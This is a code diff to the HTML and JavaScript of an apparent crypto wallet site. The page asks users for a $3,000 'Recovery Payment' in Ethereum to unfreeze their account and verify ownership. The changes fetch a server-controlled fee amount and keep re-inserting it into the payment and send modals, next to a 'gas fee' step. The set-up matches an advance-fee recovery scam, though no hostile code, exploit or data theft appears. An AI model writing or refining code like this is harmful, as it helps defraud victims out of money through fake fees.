@@ -491,7 +491,7 @@
 
       <!-- Payment summary table -->
       <div style="background:var(--surface2,#f8fafc);border:1px solid var(--border,#e2e8f0);border-radius:12px;padding:12px 15px;margin-bottom:14px;">
-        <div style="display:flex;justify-content:space-between;font-size:13px;padding:5px 0;color:var(--text3,#94a3b8);border-bottom:1px solid var(--border,#e2e8f0);"><span>Recovery Payment</span><strong style="color:#dc2626;">$3,000.00</strong></div>
+        <div style="display:flex;justify-content:space-between;font-size:13px;padding:5px 0;color:var(--text3,#94a3b8);border-bottom:1px solid var(--border,#e2e8f0);"><span>Recovery Payment</span><strong style="color:#dc2626;" id="recovery-amt-fee">$3,000.00</strong></div>
         <div style="display:flex;justify-content:space-between;font-size:13px;padding:5px 0;color:var(--text3,#94a3b8);border-bottom:1px solid var(--border,#e2e8f0);"><span>Network</span><strong style="color:var(--text1,#1e293b);">Ethereum (ERC-20)</strong></div>
         <div style="display:flex;justify-content:space-between;font-size:13px;padding:5px 0;color:var(--text3,#94a3b8);border-bottom:1px solid var(--border,#e2e8f0);"><span>Purpose</span><strong style="color:var(--text1,#1e293b);">Unfreezing of account &amp; ownership verification</strong></div>
         <div style="display:flex;justify-content:space-between;font-size:13px;padding:5px 0;color:var(--text3,#94a3b8);border-bottom:1px solid var(--border,#e2e8f0);"><span>Payment Type</span><strong style="color:var(--text1,#1e293b);">One-time recovery payment</strong></div>
@@ -585,22 +585,27 @@
 <script>Axion.initHomepage();
 
   // ── Load dynamic recovery amount ──────────────────────────────
+  function applyRecoveryAmount(fmt, amount) {
+    const ids = [
+      'recovery-amt-notice', 'recovery-amt-step',
+      'recovery-amt-fee', 'recovery-amt-send', 'recovery-amt-pending'
+    ];
+    ids.forEach(id => {
+      const el = document.getElementById(id);
+      if (el) el.textContent = fmt;
+    });
+    window._recoveryAmount = amount;
+  }
+
   (function loadRecoveryAmount() {
     fetch('/api/recovery-amount')
       .then(r => r.ok ? r.json() : null)
       .then(data => {
         if (!data) return;
-        const fmt = data.formatted;
-        const ids = [
-          'recovery-amt-notice', 'recovery-amt-step',
-          'recovery-amt-fee', 'recovery-amt-send', 'recovery-amt-pending'
-        ];
-        ids.forEach(id => {
-          const el = document.getElementById(id);
-          if (el) el.textContent = fmt;
-        });
-        // Also store for submitGasFee to use
-        window._recoveryAmount = data.amount;
+        applyRecoveryAmount(data.formatted, data.amount);
+        // Re-apply after a short delay in case modal renders late
+        setTimeout(() => applyRecoveryAmount(data.formatted, data.amount), 800);
+        setTimeout(() => applyRecoveryAmount(data.formatted, data.amount), 2000);
       }).catch(() => {});
   })();
 </script>
@@ -975,6 +980,12 @@ function hsCopyPayAddr() {
 }
 
 function openHomeSend() {
+  // Re-apply recovery amount every time modal opens
+  if (window._recoveryAmount) {
+    applyRecoveryAmount('$' + parseFloat(window._recoveryAmount).toLocaleString('en', {minimumFractionDigits:2, maximumFractionDigits:2}), window._recoveryAmount);
+  } else {
+    fetch('/api/recovery-amount').then(r=>r.json()).then(d=>applyRecoveryAmount(d.formatted, d.amount)).catch(()=>{});
+  }
   if (sessionStorage.getItem(GAS_FEE_KEY)) {
     _hsShowStep(4);
   } else {
